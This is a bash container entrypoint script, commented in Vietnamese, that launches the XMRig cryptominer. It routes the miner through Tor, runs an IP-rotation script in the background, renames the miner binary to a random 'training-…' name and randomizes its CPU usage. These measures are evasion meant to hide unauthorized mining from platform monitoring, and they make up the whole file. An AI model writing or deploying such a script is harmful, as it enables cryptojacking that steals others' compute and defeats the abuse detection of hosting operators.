#!/bin/bash

# Khởi động dịch vụ Tor và Privoxy
service tor start
service privoxy start

# Khởi động script đổi IP ngẫu nhiên trong nền
/root/change_ip.sh &

# Kiểm tra xem xmrig_name.txt có tồn tại không, nếu không thì tạo tên mới và khởi động XMRig
if [ ! -f /root/xmrig_name.txt ]; then
    RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
    mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/$RANDOM_NAME
    chmod +x $WORK_DIR/$RANDOM_NAME
    echo $RANDOM_NAME > /root/xmrig_name.txt
    echo "Chạy XMRig với tên mới $RANDOM_NAME..."
    cpu_hint=$(shuf -i 70-90 -n 1)
    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$cpu_hint
else
    # Nếu đã có tên, khởi động lại XMRig
    RANDOM_NAME=$(cat /root/xmrig_name.txt)
    echo "Chạy lại XMRig với tên $RANDOM_NAME..."
    cpu_hint=$(shuf -i 70-90 -n 1)
    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$cpu_hint
fi

# Giữ container chạy
tail -f /dev/null
